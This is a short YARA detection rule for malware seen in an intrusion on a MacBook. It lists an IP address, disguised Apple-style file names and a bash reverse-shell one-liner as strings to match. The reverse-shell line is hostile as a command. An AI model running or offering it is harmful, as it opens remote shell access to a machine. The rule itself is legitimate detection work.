rule december_intrustion_malware : bash_calls_cahpter 
{
    meta: 
        description = "Malware seen in intrusion on mikes-macbook-pro"
        severity = "Critical"
        attribution = "unknown"

    strings:
        $a = "211.77.5.37"
        $b = "iTunesBackup"
        $c = "iTunesSupport"
        $d = "security_update.app"
        $e = "bash -i >& /dev/tcp/127.0.0.1/1583 0>&1"

    condition: 
        any of them
}
